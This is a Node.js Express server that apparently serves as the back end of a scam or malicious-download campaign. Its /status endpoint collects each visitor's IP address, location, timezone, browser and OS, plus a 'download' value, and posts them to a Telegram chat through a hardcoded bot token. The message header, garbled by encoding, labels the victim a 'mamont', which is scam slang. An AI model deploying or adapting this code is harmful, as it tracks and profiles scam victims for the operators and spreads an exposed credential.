
const cors = require('cors');
const express = require('express');
const app = express();
app.use(express.json());
app.use(cors());
const port = 3464;

async function sendMessage(text) {
  let tg = {
    token: "6990432027:AAGVDKz8AL-BEaOsJGuCehgc8HLctTkhQFE", // TG TOKEN
    chat_id: "-1002131548096" // TH CHAT
  }
  const url = `https://api.telegram.org/bot${tg.token}/sendMessage`

  const obj = {
      chat_id: tg.chat_id, 
      parse_mode: "HTML",
      text: text 
  };

  await fetch(url, {
      method: "POST",
      headers: {
          "Content-Type": "application/json"
      },
      body: JSON.stringify(obj)
  });
}

app.post('/status', (req, res) => {
    console.log(req.body)
    sendMessage(`
    đŸ”¥ĐœĐ°Đ¼Đ¾Đ½Ñ‚ ĐºĐ°Ñ‡Đ°ĐµÑ‚! đŸ¦£
      IP: <code>${req.headers["x-forwarded-for"] || "?"}</code>
      đŸ´â€â˜ ï¸ Đ¡Ñ‚Ñ€Đ°Đ½Đ°: <code>${req.headers["cf-ipcountry"] || "?"}</code>
      đŸ‘â€đŸ—¨ Đ“Đ¾Ñ€Đ¾Đ´: <code>${req.headers["cf-ipcity"] || "?"}</code>
      đŸŒ Timezone: <code>${req.headers["cf-timezone"] || "?"}</code>
      đŸŒ Browser: <code>${req.headers["user-agent"] || "?"}</code>
      đŸ’» OS: <code>${req.headers["sec-ch-ua-platform"] || "?"}</code>
      âœ… <code>${req.body.download}</code>
    `)
})
app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

